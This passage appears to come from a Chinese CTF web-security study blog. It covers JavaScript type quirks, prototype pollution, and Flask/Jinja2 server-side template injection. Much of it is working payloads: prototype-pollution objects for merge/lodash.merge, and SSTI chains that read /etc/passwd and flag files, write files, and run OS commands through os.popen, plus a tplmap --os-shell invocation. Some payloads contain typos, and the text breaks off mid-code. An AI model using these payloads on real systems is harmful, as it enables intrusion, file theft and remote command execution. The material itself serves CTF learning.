//整数的负大数次方为0</span><br>&lt;0<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">-1e-1234 //负数的负大数次方为-0</span><br>&lt;-0<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0===-0</span><br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1337/0</span><br>&lt;无穷<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1337/-0</span><br>&lt;负无穷<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">负无穷==正无穷</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">e=-1</span><br>&lt;-1<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">!e++</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">!e--</span><br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">!<span class="hljs-string">&#x27;0&#x27;</span>  //例子 f==!f  f是<span class="hljs-string">&quot;0&quot;</span>就行</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">!<span class="hljs-string">&#x27;&#x27;</span></span>   <br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">a=[<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;hello&quot;</span>]</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">a[<span class="hljs-string">&quot;name&quot;</span>]</span><br>&lt;&#x27;hello&#x27;<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">a[[<span class="hljs-string">&quot;name&quot;</span>]]</span><br>&lt;&#x27;hello&#x27;<br></code></pre></td></tr></table></figure><h1 id="类型污染"><a href="#类型污染" class="headerlink" title="类型污染"></a>类型污染</h1><p>first !&#x3D;&#x3D; second &amp;&amp; shal(salt + frist) &#x3D;&#x3D;&#x3D; shal(salt + second)</p><p>POST : {“frist” : “A” “second”: [“A”]}</p><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">Function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;...&#125;;<br>let f1 = <span class="hljs-keyword">new</span> Foo();<br>解释：<br>每个函数都有一个 prototype 属性，指向一个对象，这个对象包含该构造函数所有实例共享的方法和属性。<br>每个对象有一个 __proto__ 属性，指向创建该对象的构造函数的 prototype。<br>let foo = &#123;<span class="hljs-attr">bar</span>:<span class="hljs-number">1</span>&#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(foo.bar); <span class="hljs-comment">//1</span><br>foo.__proto__.bar=<span class="hljs-number">2</span>; <span class="hljs-comment">//把foo的原型object</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(foo.bar); <span class="hljs-comment">//还是1</span><br>let zoo=&#123;&#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(zoo.bar); <span class="hljs-comment">//结果是&#123;&#125;而不是2</span><br>我.uert=张三<br>除非我里面没有张三,才是张铁柱<br>该爹法<br>val.__proto__.isAdmin = <span class="hljs-literal">true</span><br>换爹法<br>val.__proto__=&#123;<span class="hljs-string">&#x27;isAdmin&#x27;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p><strong>举例说明：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-keyword">let</span> john = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;John&quot;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br>john.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// &quot;Hello, John&quot;</span><br></code></pre></td></tr></table></figure><p>在这个例子中：</p><ul><li><code>john</code> 是通过 <code>new Person()</code> 创建的对象。</li><li><code>john.__proto__</code> 指向 <code>Person.prototype</code>，它包含 <code>sayHello</code> 方法。</li><li>当你调用 <code>john.sayHello()</code> 时，JavaScript 引擎会沿着 <code>__proto__</code> 查找这个方法，最终在 <code>Person.prototype</code> 上找到并执行。</li></ul><h1 id="原型链图解"><a href="#原型链图解" class="headerlink" title="原型链图解"></a>原型链图解</h1><h3 id="JavaScript-原型链的核心概念："><a href="#JavaScript-原型链的核心概念：" class="headerlink" title="JavaScript 原型链的核心概念："></a>JavaScript 原型链的核心概念：</h3><ol><li><strong>每个对象都有一个隐式原型（<code>__proto__</code>）</strong>：<ul><li>当你创建一个对象时，该对象会有一个隐式原型指向它的构造函数的 <code>prototype</code> 属性。</li></ul></li><li><strong>构造函数与 <code>prototype</code> 属性</strong>：<ul><li>每个函数都有一个显式原型属性（<code>prototype</code>），这个属性指向通过这个构造函数创建的实例对象的原型。</li></ul></li><li>**对象的 <code>__proto__</code> 指向构造函数的 <code>prototype</code>**：<ul><li>例如，<code>let obj = new Foo();</code> 中，<code>obj.__proto__ === Foo.prototype</code>。即 <code>obj</code> 的原型指向了 <code>Foo</code> 构造函数的 <code>prototype</code>。</li></ul></li><li><strong>构造函数本身也是对象</strong>：<ul><li>所以构造函数 <code>Foo</code> 也是由 <code>Function</code> 构造出来的，它有一个 <code>__proto__</code>，指向 <code>Function.prototype</code>。</li></ul></li><li>**终点是 <code>null</code>**：<ul><li>原型链的终点是 <code>null</code>，即 <code>Object.prototype.__proto__ === null</code>。</li></ul></li></ol><h3 id="更详细的图形说明："><a href="#更详细的图形说明：" class="headerlink" title="更详细的图形说明："></a>更详细的图形说明：</h3><ul><li><strong>Foo 对象实例</strong>：<ul><li><code>foo.__proto__ -&gt; Foo.prototype</code></li></ul></li><li><strong>Foo 构造函数</strong>：<ul><li><code>Foo.__proto__ -&gt; Function.prototype</code></li></ul></li><li><strong>Function 构造函数</strong>：<ul><li><code>Function.__proto__ -&gt; Function.prototype</code></li><li><code>Function.prototype.__proto__ -&gt; Object.prototype</code></li></ul></li><li><strong>Object 构造函数</strong>：<ul><li><code>Object.__proto__ -&gt; Function.prototype</code></li><li><code>Object.prototype.__proto__ -&gt; null</code></li></ul></li></ul><p>这个层次结构可以这样看：</p><ul><li><strong>Foo 的实例</strong>：继承自 <code>Foo.prototype</code></li><li><strong>Foo.prototype</strong>：继承自 <code>Object.prototype</code></li><li><strong>Foo（构造函数本身）</strong>：继承自 <code>Function.prototype</code></li><li><strong>Function.prototype</strong>：继承自 <code>Object.prototype</code></li><li><strong>Object.prototype</strong>：继承自 <code>null</code>，原型链结束。</li></ul><h1 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">1.</span>obj1[xx]= obj2[yy] 换爹    注释: 这种写法是一种动态属性赋值方式。它的意思是，将 obj2 对象中键为 yy 的值赋给 obj1 对象中键为 xx 的属性。<br><br><span class="hljs-keyword">let</span> obj1 = &#123;&#125;;<br><span class="hljs-keyword">let</span> obj2 = &#123;<br>  <span class="hljs-attr">key1</span>: &#123; <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> &#125;,<br>  <span class="hljs-attr">key2</span>: <span class="hljs-string">&quot;value2&quot;</span><br>&#125;;<br><br><span class="hljs-comment">// 动态赋值的变量</span><br><span class="hljs-keyword">let</span> xx = <span class="hljs-string">&quot;__proto__&quot;</span>; <span class="hljs-comment">// 设置为 &quot;__proto__&quot; 来修改原型链</span><br><span class="hljs-keyword">let</span> yy = <span class="hljs-string">&quot;key1&quot;</span>; <span class="hljs-comment">// 从 obj2 中获取键为 key1 的值</span><br><br><span class="hljs-comment">// 通过原型链污染将 obj2[key1] 的值赋给 obj1.__proto__</span><br>obj1[xx] = obj2[yy];<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj1.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true, 通过原型链污染，obj1 获得了 isAdmin 属性</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true, 所有对象都被污染了</span><br><br><br><span class="hljs-number">2.</span>obj[xx][yy]=zz 改爹**   在 obj[xx] 返回的结果（假设是一个对象）上，再通过 yy 动态访问其属性。<br><span class="hljs-comment">// 定义一个空对象 obj</span><br><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br><br><span class="hljs-comment">// 设置动态变量</span><br><span class="hljs-keyword">let</span> xx = <span class="hljs-string">&quot;__proto__&quot;</span>;  <span class="hljs-comment">// 用来修改对象的原型链</span><br><span class="hljs-keyword">let</span> yy = <span class="hljs-string">&quot;isAdmin&quot;</span>;    <span class="hljs-comment">// 我们要在原型链上添加的属性</span><br><span class="hljs-keyword">let</span> zz = <span class="hljs-literal">true</span>;         <span class="hljs-comment">// 要赋的值</span><br><br><span class="hljs-comment">// 使用 obj[xx][yy] = zz 改爹法修改原型链</span><br>obj[xx][yy] = zz;<br><br><span class="hljs-comment">// 现在任何通过 Object 创建的对象都继承了 isAdmin 属性</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-property">isAdmin</span>);  <span class="hljs-comment">// true, 所有新对象也被污染了</span><br>+<br><br><br> <span class="hljs-number">2.</span><span class="hljs-title function_">merge</span>() 函数的原型链污染<br><span class="hljs-keyword">let</span> maliciousPayload = &#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;polluted&quot;</span>: <span class="hljs-string">&quot;malicious value&quot;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br><span class="hljs-title function_">merge</span>(obj, maliciousPayload);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">polluted</span>);  <span class="hljs-comment">// 输出 &quot;malicious value&quot;</span><br><br><br><br><span class="hljs-number">4.</span>lodash.<span class="hljs-title function_">merge</span>() 的原型链污染<br><span class="hljs-keyword">const</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br><span class="hljs-keyword">let</span> maliciousPayload = &#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;polluted&quot;</span>: <span class="hljs-string">&quot;malicious value&quot;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>_.<span class="hljs-title function_">merge</span>(obj, maliciousPayload);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">polluted</span>);  <span class="hljs-comment">// 输出 &quot;malicious value&quot;</span><br><br><br><span class="hljs-number">5.</span> <span class="hljs-title function_">set</span>() 和 <span class="hljs-title function_">update</span>()<br><span class="hljs-keyword">let</span> maliciousPayload = &#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;polluted&quot;</span>: <span class="hljs-string">&quot;malicious value&quot;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// 假设有个深度更新的库函数 `set`</span><br><span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;key&#x27;</span>, maliciousPayload);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">polluted</span>);  <span class="hljs-comment">// 输出 &quot;malicious value&quot;</span><br><br><br></code></pre></td></tr></table></figure><p>your[req.body.key] &#x3D; req.body.value</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&#x27;__proto__&#x27;</span>,<span class="hljs-string">&quot;value&quot;</span>:&#123;<span class="hljs-string">&quot;isAdmin&quot;</span>:<span class="hljs-number">1</span>&#125;&#125;<br>对key__proto__过滤传&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">[[&#x27;__proto__&#x27;]]</span>&#125;试试<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI</title>
    <link href="/2024/09/01/SSTI/"/>
    <url>/2024/09/01/SSTI/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a><code>SSTI</code></h1><p><code>$&#123;7*7&#125;</code></p><ul><li><code>y a&#123;*comment*&#125;b</code><ul><li><code>y Smarty</code></li><li><code>n $&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125; -&gt; Mako</code></li><li><code>n &#123;&#123;7*7&#125;&#125;</code><ul><li><code>y &#123;&#123;7*'7'&#125;&#125; -&gt; jinja2 Twig</code></li><li><code>n</code></li></ul></li></ul></li></ul><h1 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a><code>Flask</code></h1><h2 id="内置方法"><a href="#内置方法" class="headerlink" title="内置方法"></a><code>内置方法</code></h2><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs leaf">- __class__: 返回当前对象所属的类。例：&quot;&quot;.__class__  <span class="hljs-punctuation">#</span> &lt;class &#x27;str&#x27;&gt;<br>- __bases__: 以元组的形式返回该类的直接父类。例：&quot;&quot;.__class__.__bases__ <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-operator">&lt;</span><span class="hljs-variable">class</span> &#x27;<span class="hljs-variable">object</span>&#x27;<span class="hljs-operator">&gt;</span>,)</span><br>- __base__: 以字符串形式返回该类的基类(Object)。例：&quot;&quot;.__class__.__base__ <span class="hljs-punctuation">#</span>&lt;class &#x27;object&#x27;&gt;<br>- __mro__: 以元组的形式返回解析方法的调用顺序。例：&quot;&quot;.__class__.__mro__ <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-operator">&lt;</span><span class="hljs-variable">class</span> &#x27;<span class="hljs-variable">str</span>&#x27;<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-variable">class</span> &#x27;<span class="hljs-variable">object</span>&#x27;<span class="hljs-operator">&gt;</span>)</span><br>- __subclasses__(): 返回类的所有子类，通常配合__class__，__base__来获取执行命令或文件操作的类。 例：().__class__.__base__.__subclasses__()<br>- __init__: 返回初始化对象。<br>- __globals__: 以字典的形式返回当前空间下的所有可使用模块、方法以及所有变量。<br>- __builtins__: 返回当前所有导入的内置函数。<br></code></pre></td></tr></table></figure><h2 id="找到链再进行过滤绕过"><a href="#找到链再进行过滤绕过" class="headerlink" title="找到链再进行过滤绕过"></a><code>找到链再进行过滤绕过</code></h2><h3 id="找到object对象"><a href="#找到object对象" class="headerlink" title="找到object对象"></a><code>找到object对象</code></h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> &#x27;&#x27;.<span class="hljs-strong">__class__</span>.mro<span class="hljs-strong">__[1]</span><br><span class="hljs-strong">- &#123;&#125;.__</span>class<span class="hljs-strong">__.__</span>bases<span class="hljs-strong">__[0]</span><br><span class="hljs-strong">- ().__</span>class<span class="hljs-strong">__.__</span>bases<span class="hljs-strong">__[0]</span><br><span class="hljs-strong">- [].__</span>class<span class="hljs-strong">__.__</span>bases<span class="hljs-strong">__[0]</span><br></code></pre></td></tr></table></figure><h3 id="获取所有有用的class"><a href="#获取所有有用的class" class="headerlink" title="获取所有有用的class"></a><code>获取所有有用的class</code></h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">- <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()<br>- &#123;&#125;.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()<br>- ().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()<br>- [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()<br>- &#123;&#123; [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>() &#125;&#125;<br>- &#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">___mro__</span>()[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;<br>- &#123;&#123; <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>() &#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a><code>文件读取</code></h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- ().__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[40](<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">config.items</span>()[4][1].__class__.__mro__[2].__subclasses__()[40](<span class="hljs-name">&quot;/tmp/flag&quot;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">get_flashed_messages.__globals__.__builtins__.open</span>(<span class="hljs-name">&quot;/etc/passwd&quot;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"> Python3: 在该版本中file类被删除了，不过可以利用_frozen_importlib_external.FileLoader来读取文件：</span><br><span class="language-xml"></span><br><span class="language-xml">- [].__class__.__mro__[1].__subclasses__()[94].get_data(0,&quot;test.txt&quot;)</span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__mro__</span>[1].__subclasses__()[79][&quot;get_data&quot;](<span class="hljs-name">0</span>,<span class="hljs-string">&quot;/flag&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- `&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;app.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br><span class="language-xml">原理都是一样的，只不过环境变化有点大，并且Windows与Linux下也有差异，可编写脚本遍历：</span><br><span class="language-xml"></span><br><span class="language-xml">- 脚本遍历 object 类的所有子类，查找包含 &#x27;FileLoader&#x27; 的类名，然后使用其 get_data 方法读取 test.txt 文件的内容并解码：</span><br><span class="language-xml">- &#123;% for x in [].__class__.__mro__[1].__subclasses__() %&#125;&#123;% if &#x27;FileLoader&#x27; in x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">x</span>().get_data(<span class="hljs-name">x</span>(), <span class="hljs-string">&#x27;test.txt&#x27;</span>).decode() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br><span class="language-xml">### 文件写入</span><br><span class="language-xml"></span><br><span class="language-xml">- [].__class__.__base__.__base__.__subclasses__()[40](&#x27;/tmp/1&#x27;,&#x27;w&#x27;).write(&#x27;hello&#x27;)</span><br></code></pre></td></tr></table></figure><h1 id="动态执行，例如-input-ls"><a href="#动态执行，例如-input-ls" class="headerlink" title="动态执行，例如 ?input=ls"></a><code>动态执行，例如 ?input=ls</code></h1><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">&#123;% for x in().__class__.__base__.__subelasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__%&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>().__module.__builtins__[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">request.args.input</span>).read()&#125;&#125;</span><span class="language-xml">&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="查找想要的模块"><a href="#查找想要的模块" class="headerlink" title="查找想要的模块"></a><code>查找想要的模块</code></h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>.<span class="hljs-strong">__subelasses__</span>().index(模块名)<br><span class="hljs-bullet">-</span> 查找想要的模块:<br><span class="hljs-bullet">  -</span> num=0<br><span class="hljs-bullet">  -</span> for item in &#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1].<span class="hljs-strong">__subclasses__</span>():<br><span class="hljs-bullet">    -</span> try:<br><span class="hljs-bullet">      -</span> if &#x27;popen&#x27; in item.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>:<br><span class="hljs-bullet">        -</span> print(num,item)<br><span class="hljs-bullet">      -</span> num+=1<br><span class="hljs-bullet">    -</span> except:<br><span class="hljs-bullet">      -</span> num+=1<br><span class="hljs-bullet">-</span> &#123;% set num = 0 %&#125;&#123;% for item in &#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1].<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if &#x27;popen&#x27; in item.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span> %&#125;&#123;&#123; num &#125;&#125;: &#123;&#123; item &#125;&#125;&#123;% endif %&#125;&#123;% set num = num + 1 %&#125;&#123;% endfor %&#125;<br><br>获取全局配置：&#123;&#123;config&#125;&#125;<br></code></pre></td></tr></table></figure><p><code>tplmap工具：</code></p><ul><li><code>测试是否存在ssti：python2 tplmap.py –u &quot;xx&quot;</code></li><li><code>执行模板获取shell：python2 tplmap.py  -u &quot;xx&quot; --engine=jinja2 --os-shell</code></li></ul><h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a><code>常用payload</code></h2><h3 id="Python2"><a href="#Python2" class="headerlink" title="Python2:"></a><code>Python2:</code></h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">- 读文件: ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">r&#x27;/flag&#x27;</span> ).read()<br>- 命令执行: ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">50</span>].__init__.__func_globals.values()[<span class="hljs-number">13</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span> )<br></code></pre></td></tr></table></figure><h3 id="Python3"><a href="#Python3" class="headerlink" title="Python3:"></a><code>Python3:</code></h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code 